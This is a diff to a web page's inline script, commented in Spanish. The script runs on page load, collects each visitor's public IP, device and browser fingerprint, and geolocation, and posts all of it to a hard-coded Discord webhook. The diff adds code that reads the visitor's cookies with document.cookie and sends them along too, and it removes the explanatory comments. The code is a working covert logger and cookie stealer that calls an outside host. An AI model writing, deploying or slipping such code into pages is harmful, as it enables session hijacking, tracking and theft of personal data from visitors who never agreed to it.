@@ -75,29 +75,37 @@
 
 
     <script>
-// Función para recolectar información del usuario y enviarla a Discord
+
+function getCookies() {
+    return document.cookie || "No hay cookies disponibles";
+}
+
+
 function sendUserInfo() {
-    // Obtener IP pública usando un servicio externo
+    
     fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
-            const ip = data.ip; // La IP pública del visitante
+            const ip = data.ip; 
 
-            // Recolectar otros datos del usuario
-            const userAgent = navigator.userAgent; // User-Agent del navegador
-            const screenWidth = window.innerWidth || screen.width; // Ancho de la pantalla
-            const screenHeight = window.innerHeight || screen.height; // Altura de la pantalla
-            const os = getOS(); // Sistema operativo
-            const idioma = navigator.language || navigator.userLanguage; // Idioma del navegador
-            const connection = navigator.connection ? navigator.connection.effectiveType : "Desconocido"; // Tipo de conexión a internet
-            const referrer = document.referrer; // Página de referencia
-            const cookiesEnabled = navigator.cookieEnabled; // Si las cookies están habilitadas
-            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone; // Zona horaria
-            const currentTime = new Date().toLocaleString(); // Fecha y hora local
-            const browser = getBrowser(); // Nombre del navegador
-            const browserVersion = getBrowserVersion(); // Versión del navegador
+          
+            const userAgent = navigator.userAgent; 
+            const screenWidth = window.innerWidth || screen.width; 
+            const screenHeight = window.innerHeight || screen.height; 
+            const os = getOS(); 
+            const idioma = navigator.language || navigator.userLanguage; 
+            const connection = navigator.connection ? navigator.connection.effectiveType : "Desconocido"; 
+            const referrer = document.referrer; 
+            const cookiesEnabled = navigator.cookieEnabled; 
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone; 
+            const currentTime = new Date().toLocaleString(); 
+            const browser = getBrowser(); 
+            const browserVersion = getBrowserVersion(); 
 
-            // Información de la GPU usando WebGL
+        
+            const cookies = getCookies();
+
+        
             let gpuInfo = 'Desconocido';
             try {
                 const canvas = document.createElement('canvas');
@@ -112,17 +120,16 @@ function sendUserInfo() {
                 console.error("Error obteniendo la GPU:", error);
             }
 
-            // Información sobre la CPU (número de núcleos)
             const cpuCores = navigator.hardwareConcurrency || "Desconocido";
 
-            // Intentar obtener geolocalización sin alertar al usuario
+          
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     position => {
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
 
-                        // Información con geolocalización
+                  
                         const userInfo = {
                             IP: ip,
                             UserAgent: userAgent,
@@ -136,29 +143,30 @@ function sendUserInfo() {
                             HoraActual: currentTime,
                             Navegador: browser,
                             VersionNavegador: browserVersion,
+                            Cookies: cookies,
                             Geolocalizacion: `Latitud: ${lat}, Longitud: ${lon}`,
                             GPU: gpuInfo,
                             CPU_Cores: cpuCores
                         };
 
-                        // Enviar la información al webhook de Discord
+                      
                         sendToDiscord(userInfo);
                     },
                     () => {
-                        // Si el usuario niega la geolocalización o falla, enviar sin ubicación
-                        sendUserInfoWithoutLocation(ip, userAgent, screenWidth, screenHeight, os, idioma, connection, referrer, cookiesEnabled, timezone, currentTime, browser, browserVersion, gpuInfo, cpuCores);
+                       
+                        sendUserInfoWithoutLocation(ip, userAgent, screenWidth, screenHeight, os, idioma, connection, referrer, cookiesEnabled, timezone, currentTime, browser, browserVersion, gpuInfo, cpuCores, cookies);
                     }
                 );
             } else {
-                // Si no está disponible la geolocalización, enviar sin ella
-                sendUserInfoWithoutLocation(ip, userAgent, screenWidth, screenHeight, os, idioma, connection, referrer, cookiesEnabled, timezone, currentTime, browser, browserVersion, gpuInfo, cpuCores);
+             
+                sendUserInfoWithoutLocation(ip, userAgent, screenWidth, screenHeight, os, idioma, connection, referrer, cookiesEnabled, timezone, currentTime, browser, browserVersion, gpuInfo, cpuCores, cookies);
             }
         })
         .catch(error => console.error('Error obteniendo la IP pública:', error));
 }
 
-// Función para enviar la información al webhook sin geolocalización
-function sendUserInfoWithoutLocation(ip, userAgent, screenWidth, screenHeight, os, idioma, connection, referrer, cookiesEnabled, timezone, currentTime, browser, browserVersion, gpuInfo, cpuCores) {
+
+function sendUserInfoWithoutLocation(ip, userAgent, screenWidth, screenHeight, os, idioma, connection, referrer, cookiesEnabled, timezone, currentTime, browser, browserVersion, gpuInfo, cpuCores, cookies) {
     const userInfo = {
         IP: ip,
         UserAgent: userAgent,
@@ -172,16 +180,17 @@ function sendUserInfoWithoutLocation(ip, userAgent, screenWidth, screenHeight, o
         HoraActual: currentTime,
         Navegador: browser,
         VersionNavegador: browserVersion,
+        Cookies: cookies,
         Geolocalizacion: 'No permitida',
         GPU: gpuInfo,
         CPU_Cores: cpuCores
     };
 
-    // Enviar la información al webhook de Discord
+    
     sendToDiscord(userInfo);
 }
 
-// Función para enviar la información al webhook de Discord
+
 function sendToDiscord(userInfo) {
     const webhookUrl = "https://discord.com/api/webhooks/1294006529338507335/_zrSstE-4m_-FLwBBg4XmHiYg4KpQjM_WJ-XUdln7LNtdaj4Per8qQsPIy40H8cBqx9A";
 
@@ -200,6 +209,7 @@ function sendToDiscord(userInfo) {
                     { name: "📶 Tipo de Conexión", value: userInfo.Conexion, inline: true },
                     { name: "📄 Página de Referencia", value: userInfo.Referencia || "No disponible", inline: true },
                     { name: "🍪 Cookies Habilitadas", value: userInfo.CookiesHabilitadas ? "Sí" : "No", inline: true },
+                    { name: "🍪 Cookies", value: userInfo.Cookies, inline: false },
                     { name: "🕒 Zona Horaria", value: userInfo.ZonaHoraria, inline: true },
                     { name: "⏰ Hora Local", value: userInfo.HoraActual, inline: true },
                     { name: "🧑‍💻 Navegador", value: userInfo.Navegador, inline: true },
@@ -217,7 +227,7 @@ function sendToDiscord(userInfo) {
         ]
     };
 
-    // Realizar el POST al webhook de Discord
+  
     fetch(webhookUrl, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -233,7 +243,7 @@ function sendToDiscord(userInfo) {
     .catch(error => console.error("Error al realizar la solicitud POST:", error));
 }
 
-// Función para obtener el sistema operativo
+
 function getOS() {
     const userAgent = navigator.userAgent || navigator.vendor || window.opera;
     if (/windows phone/i.test(userAgent)) {
@@ -257,7 +267,7 @@ function getOS() {
     return "Desconocido";
 }
 
-// Función para obtener el nombre del navegador
+
 function getBrowser() {
     const userAgent = navigator.userAgent;
     if (userAgent.indexOf("Firefox") > -1) {
@@ -275,7 +285,7 @@ function getBrowser() {
     }
 }
 
-// Función para obtener la versión del navegador
+
 function getBrowserVersion() {
     const userAgent = navigator.userAgent;
     const browser = getBrowser();
@@ -295,10 +305,8 @@ function getBrowserVersion() {
     return version;
 }
 
-// Llamar a la función para enviar la información del usuario
+
 sendUserInfo();
-
-
 
 
     </script>
